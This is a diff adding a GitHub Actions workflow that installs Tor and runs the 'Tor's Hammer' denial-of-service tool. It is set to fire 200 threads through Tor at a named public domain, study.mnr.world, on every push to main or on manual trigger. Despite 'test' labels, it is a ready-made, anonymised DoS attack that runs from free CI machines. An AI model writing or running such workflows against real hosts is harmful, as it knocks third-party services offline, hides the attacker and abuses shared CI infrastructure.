@@ -1,0 +1,46 @@
+name: Tor's Hammer DoS Test
+
+on:
+  push:  # Or: pull_request, schedule: '0 0 * * 0' for weekly
+    branches: [ main ]
+  workflow_dispatch:  # Manual trigger from GitHub UI
+
+jobs:
+  test:
+    runs-on: ubuntu-latest  # Free VM with Python pre-installed
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.x'
+
+    - name: Install dependencies
+      run: |
+        pip install pysocks requests
+        sudo apt update && sudo apt install -y tor  # For -T flag (optional)
+
+    - name: Start Tor (if using anonymity)
+      run: |
+        sudo systemctl start tor
+        # Wait a sec for Tor to init
+        sleep 5
+
+    - name: Run Tor's Hammer
+      run: |
+        # Replace with YOUR test target (e.g., your dev server IP/domain)
+        python3 torshammer.py -s study.mnr.world -p 80 -r 200 -T  # -T for Tor
+        # Or local test: python3 torshammer.py -s 127.0.0.1 -p 8000 -r 100
+      env:
+        # Optional: Pass secrets if needed (e.g., for auth targets)
+        TARGET_HOST: ${{ secrets.TEST_TARGET }}  # Store in repo Settings > Secrets
+
+    - name: Upload logs (if it generates any)
+      uses: actions/upload-artifact@v4
+      if: always()
+      with:
+        name: dos-logs
+        path: *.log  # Adjust if tool outputs logs
